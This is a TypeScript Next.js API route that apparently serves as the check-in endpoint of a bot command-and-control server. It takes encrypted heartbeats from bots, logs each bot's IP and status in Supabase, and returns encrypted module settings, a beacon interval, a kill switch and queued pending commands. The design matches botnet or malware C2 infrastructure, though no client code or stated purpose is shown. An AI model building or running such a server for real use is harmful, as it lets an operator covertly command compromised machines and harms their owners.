import { createClient } from "@supabase/supabase-js";
import { NextRequest, NextResponse } from "next/server";
import { deriveSessionKey, decryptPayload, encryptPayload } from "@/lib/crypto";

function getSupabase() {
    return createClient(
        process.env.NEXT_PUBLIC_SUPABASE_URL!,
        process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
    );
}

export async function POST(request: NextRequest) {
    try {
        const botPubKeyB64 = request.headers.get("X-Bot-PubKey");
        if (!botPubKeyB64) {
            return NextResponse.json({ error: "missing pubkey" }, { status: 400 });
        }

        const sessionKey = await deriveSessionKey(botPubKeyB64);

        const encData = await request.json();
        if (!encData || !encData.iv || !encData.ciphertext) {
            return NextResponse.json({ error: "invalid payload" }, { status: 400 });
        }

        const body = await decryptPayload(sessionKey, encData.iv, encData.ciphertext);
        const { bot_id } = body;

        if (!bot_id) {
            return NextResponse.json({ error: "bot_id required" }, { status: 400 });
        }

        const supabase = getSupabase();
        const ip = request.headers.get("x-forwarded-for")?.split(",")[0]?.trim()
            || request.headers.get("x-real-ip")
            || "unknown";

        await supabase
            .from("bots")
            .update({ last_seen_at: new Date().toISOString(), ip_address: ip, status: "active" })
            .eq("bot_id", bot_id);

        const { data: config } = await supabase
            .from("bot_configs")
            .select("*")
            .eq("bot_id", bot_id)
            .single();

        const { data: commands } = await supabase
            .from("commands")
            .select("*")
            .eq("bot_id", bot_id)
            .eq("status", "pending")
            .order("created_at", { ascending: true });

        if (commands && commands.length > 0) {
            const ids = commands.map((c) => c.id);
            await supabase.from("commands").update({ status: "delivered" }).in("id", ids);
        }

        const responseObj = {
            status: "ok",
            config: config || { modules_enabled: [], beacon_interval_sec: 300, kill_switch: false },
            commands: commands || [],
        };

        const encResponse = await encryptPayload(sessionKey, responseObj);
        return NextResponse.json(encResponse);
    } catch (e) {
        console.error("Heartbeat error:", e);
        return NextResponse.json({ error: "internal error" }, { status: 500 });
    }
}
